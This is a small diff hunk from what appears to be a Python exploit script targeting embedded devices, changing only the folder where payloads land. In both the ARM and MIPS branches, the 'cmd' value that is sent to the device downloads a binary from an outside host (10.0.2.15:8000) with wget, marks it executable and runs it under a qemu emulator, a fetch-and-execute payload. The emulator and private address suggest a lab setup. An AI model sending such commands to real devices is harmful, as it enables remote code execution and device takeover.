@@ -22,12 +22,12 @@ port = 80
 
 if deviceT == 1:
 	data = {
-		'cmd':'wget -P /tmp http://10.0.2.15:8000/arm; chmod +x /tmp/arm; qemu-arm-static /tmp/arm'
+		'cmd':'wget -P /payloads http://10.0.2.15:8000/arm; chmod +x /payloads/arm; qemu-arm-static /payloads/arm'
 	}
 
 elif deviceT == 2:
 	data = {
-		'cmd':'wget -P /tmp http://10.0.2.15:8000/mips; chmod +x /tmp/mips; qemu-mips-static /tmp/mips'
+		'cmd':'wget -P /payloads http://10.0.2.15:8000/mips; chmod +x /payloads/mips; qemu-mips-static /payloads/mips'
 	}
 else:
 	print('Device Type must be 1(arm) or 2(mips)')
